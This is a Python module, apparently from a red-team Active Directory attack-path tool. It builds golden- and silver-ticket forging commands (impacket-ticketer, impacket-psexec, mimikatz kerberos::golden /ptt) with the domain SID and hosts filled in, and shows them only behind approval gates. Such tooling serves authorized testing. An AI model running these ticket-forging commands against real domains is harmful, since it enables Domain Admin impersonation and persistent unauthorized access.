"""Post-compromise PERSISTENCE techniques — golden / silver ticket forging.

Ticket forging is not a routing edge. A route-to-Domain-Admin search must not walk THROUGH a
golden ticket: forging one presupposes you already hold krbtgt (i.e. you have already reached the
domain), so an edge for it would let the path engine "reach DA" by assuming the very thing the
route exists to achieve. So this lives OUTSIDE the abusable-edge taxonomy entirely — a small
catalog keyed by node type that the ``/cockpit/ad`` panel surfaces as persistence ACTIONS on the
relevant node, gated behind actually holding the required secret:

  * GOLDEN ticket — offered on the DOMAIN node once krbtgt is compromised (a DCSync / a captured
    DC TGT). Forge a TGT for any user, impersonating a Domain Admin at will, for the krbtgt
    password's lifetime.
  * SILVER ticket — offered on a COMPUTER / service node once that service account's hash is
    held (you own the host). Forge a service ticket to that one service, no DC contact.

Both are PROPOSE-ONLY: like :mod:`techniques`, this module renders a command string with the
concrete domain/SID/host substituted in, and NOTHING here executes. The command still only runs
later through the gated executor, approve-each, exactly like an abusable edge's abuse — but it is
never part of the route-to-DA search, and never enters the orchestrator's frontier.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any

from .schema import Graph

# The persistence technique kinds. Deliberately NOT in schema.ABUSABLE_EDGES: the path engine and
# the orchestrator frontier walk only abusable edges, so keeping these out of that tuple is what
# guarantees ticket forging is never traversed. Regression-locked in test_deleg_tickets.py.
KINDS: tuple[str, ...] = ("GoldenTicket", "SilverTicket")


def is_persistence(kind: str) -> bool:
    return kind in KINDS


@dataclass(frozen=True)
class PersistenceSpec:
    kind: str
    title: str
    summary: str          # one line: what forging this ticket gets you
    tool: str
    node_type: str        # the node type it is offered on ("domain" | "computer")
    requires: str         # the secret you must already hold for this to be offered
    template: str         # Linux (impacket-ticketer) command, with {placeholders}
    win_template: str     # native Windows (mimikatz) command, same {placeholders}


_GOLDEN = PersistenceSpec(
    kind="GoldenTicket",
    title="Golden ticket (forge a TGT)",
    summary="With krbtgt's hash you can forge a TGT for any user in {domain} — impersonate a "
            "Domain Admin at will until krbtgt is rotated twice. Domain persistence.",
    tool="impacket-ticketer / mimikatz",
    node_type="domain",
    requires="krbtgt's NT hash (from a DCSync / captured DC TGT)",
    template=("impacket-ticketer -nthash <KRBTGT-HASH> -domain-sid {sid} -domain {domain} "
              "administrator\n"
              "KRB5CCNAME=administrator.ccache impacket-psexec -k -no-pass "
              "{domain}/administrator@{dc}"),
    win_template=("mimikatz kerberos::golden /user:administrator /domain:{domain} /sid:{sid} "
                  "/krbtgt:<KRBTGT-HASH> /ptt"),
)

_SILVER = PersistenceSpec(
    kind="SilverTicket",
    title="Silver ticket (forge a service ticket)",
    summary="With {host}'s account hash you can forge a service ticket to its services and "
            "authenticate as any user — no DC contact, no krbtgt. Host persistence.",
    tool="impacket-ticketer / mimikatz",
    node_type="computer",
    requires="the service account's NT/AES hash (you own {host})",
    template=("impacket-ticketer -nthash <SERVICE-HASH> -domain-sid {sid} -domain {domain} "
              "-spn cifs/{host} administrator"),
    win_template=("mimikatz kerberos::golden /sid:{sid} /domain:{domain} /target:{host} "
                  "/service:cifs /rc4:<SERVICE-HASH> /user:administrator /ptt"),
)


def _domain_sid(graph: Graph) -> str:
    """The domain SID (``S-1-5-21-…``), for the ticket's ``-domain-sid``/`/sid`. Taken from the
    domain node id, else derived by stripping the RID off a high-value RID-512/516 principal."""
    for n in graph.nodes.values():
        if n.type == "domain" and n.id.startswith("S-1-5-21-"):
            return n.id
    for n in graph.nodes.values():
        rid = n.id.rsplit("-", 1)[-1] if n.id.startswith("S-1-5-21-") else ""
        if rid in ("512", "516", "519"):
            return n.id.rsplit("-", 1)[0]
    return "<DOMAIN-SID>"


def _guess_dc(graph: Graph) -> str:
    for n in graph.nodes.values():
        if n.type == "computer" and (n.high_value or n.id.endswith("-516")):
            return str(n.props.get("name") or n.label)
    for n in graph.nodes.values():
        if n.type == "computer":
            return str(n.props.get("name") or n.label)
    return "<DC>"


def _domain_node(graph: Graph):
    """The node golden is offered ON: the domain object if collected, else the DA objective."""
    for n in graph.nodes.values():
        if n.type == "domain":
            return n
    for n in graph.nodes.values():
        if n.type == "group" and n.id.endswith("-512"):
            return n
    return None


def _short_host(label: str) -> str:
    return label.split("@", 1)[0].split(".", 1)[0]


def _krbtgt_held(graph: Graph, state: Any) -> bool:
    """Do we hold krbtgt (so golden is legitimately offered)? True once the domain / DA objective
    is owned, or once an edge that yields krbtgt — a DCSync, or a captured DC TGT via unconstrained
    delegation — has been traversed. This is the gate: golden is NOT offered before this holds."""
    owned = set(getattr(state, "owned", ()) or ())
    for n in graph.nodes.values():
        if n.id in owned and (n.type == "domain" or n.id.endswith("-512")):
            return True
    for key in getattr(state, "traversed", ()) or ():
        kind = str(key).rsplit("|", 1)[-1]
        if kind in ("DCSync", "TrustedForDelegation"):
            return True
    return False


def _fill(template: str, ctx: dict[str, str]) -> str:
    out = template
    for k, v in ctx.items():
        out = out.replace("{" + k + "}", v)
    return out


def _render(spec: PersistenceSpec, node_id: str, node_label: str, ctx: dict[str, str]) -> dict:
    return {
        "kind": spec.kind,
        "node_id": node_id,
        "node_label": node_label,
        "node_type": spec.node_type,
        "title": spec.title,
        "summary": _fill(spec.summary, ctx),
        "tool": spec.tool,
        "requires": _fill(spec.requires, ctx),
        # Forging a ticket is a real, high-impact domain change — the UI marks it red, and both
        # commands trip the danger heuristic when sent to the executor (ticketer / mimikatz).
        "destructive": True,
        "persistence": True,
        "commands": [{"lang": "bash", "cmd": _fill(spec.template, ctx)}],
        "windows_commands": [{"lang": "powershell", "cmd": _fill(spec.win_template, ctx)}],
        "available": True,
    }


def persistence_actions(graph: Graph, state: Any, dc: str | None = None) -> list[dict]:
    """The persistence actions offered NOW, given what the operator holds.

    Golden is offered on the domain node once krbtgt is held; silver on each OWNED computer node
    (you have its account hash). Only AVAILABLE actions are returned — a forging action is never
    offered before the secret it needs is held. Returns display data; executes nothing.
    """
    actions: list[dict] = []
    sid = _domain_sid(graph)
    domain = str(graph.domain or "DOMAIN")
    dcname = dc or _guess_dc(graph)
    owned = set(getattr(state, "owned", ()) or ())

    # GOLDEN — on the domain node, once krbtgt is compromised.
    dom = _domain_node(graph)
    if dom is not None and _krbtgt_held(graph, state):
        actions.append(_render(_GOLDEN, dom.id, dom.label,
                               {"domain": domain, "sid": sid, "dc": dcname}))

    # SILVER — on each owned computer/service account (its hash is held).
    for nid in owned:
        n = graph.node(nid)
        if n is None or n.type != "computer":
            continue
        host = _short_host(n.label)
        actions.append(_render(_SILVER, n.id, n.label,
                               {"domain": domain, "sid": sid, "dc": dcname, "host": host}))
    return actions


__all__ = ["KINDS", "is_persistence", "PersistenceSpec", "persistence_actions"]
